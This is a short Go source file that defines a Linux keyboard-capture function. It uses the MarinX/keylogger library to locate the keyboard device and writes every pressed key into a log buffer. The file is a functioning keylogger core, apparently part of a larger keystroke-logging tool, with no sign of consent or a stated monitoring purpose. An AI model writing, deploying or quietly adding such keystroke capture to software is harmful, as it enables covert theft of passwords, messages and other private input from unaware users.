package linux

import (
	"bytes"
	"log"

	"github.com/MarinX/keylogger"
)

func CaptureKeyboardKeysLinux(logBuffer *bytes.Buffer) {
	device := keylogger.FindKeyboardDevice()
	if device == "" {
		log.Fatal("No keyboard found...")
	}
	keyboard, err := keylogger.New(device)
	if err != nil {
		log.Fatal(err)
	}

	events := keyboard.Read()

	for e := range events {
		switch e.Type {
		case keylogger.EvKey:
			if e.KeyPress() {
				logBuffer.WriteString(e.KeyString())
			}
		}
	}
}
